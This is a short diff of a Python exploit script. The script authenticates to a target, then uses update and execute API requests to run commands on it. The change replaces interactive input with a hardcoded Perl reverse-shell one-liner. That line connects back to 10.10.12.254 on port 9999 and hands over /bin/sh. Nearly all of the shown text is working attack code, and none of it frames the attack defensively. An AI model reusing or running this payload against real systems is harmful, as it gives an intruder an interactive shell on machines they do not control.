@@ -41,11 +41,13 @@ auth  = requests.post(url, data=json.dumps(payload), headers=(headers))
 auth = auth.json()
 
 while True:
-    #cmd = raw_input('\033[41m[cmd]>>: \033[0m ')
-    #if cmd == "" : print "Result of last command:"
-    #if cmd == "quit" : break
+    '''
+    cmd = raw_input('\033[41m[cmd]>>: \033[0m ')
+    if cmd == "" : print "Result of last command:"
+    if cmd == "quit" : break
+    '''
 
-    cmd = """perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' & """
+    cmd = """perl -e 'use Socket;$i="10.10.12.254";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' & """
 
 ### update
     payload = {
@@ -62,7 +64,6 @@ while True:
     }
 
     cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers))
-
 ### execute
 
     payload = {
